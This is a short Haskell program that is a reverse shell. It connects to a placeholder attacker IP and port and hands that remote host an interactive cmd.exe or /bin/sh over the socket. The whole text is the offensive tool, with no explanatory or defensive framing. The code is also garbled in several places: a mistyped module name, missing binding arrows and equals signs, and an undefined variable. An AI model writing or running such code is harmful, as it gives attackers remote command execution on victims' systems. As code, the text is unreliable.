import Network.Socket

import System.I0

import System.Process

main = do

let ip= "attacker_ip"

let port =attacker_port

sock <- socket AF_INET Stream 0

addr <- inet_addr ip

connect sock (SockAddrInet port addr) h socketToHandle sock ReadWriteMode

hSetBuffering h NoBuffering

let shell if os == "mingw32" then "cmd.exe" else "/bin/sh"

ph <- runProcess shell () Nothing Nothing (Just h) (Just h) (Just h)

waitForProcess ph

return ()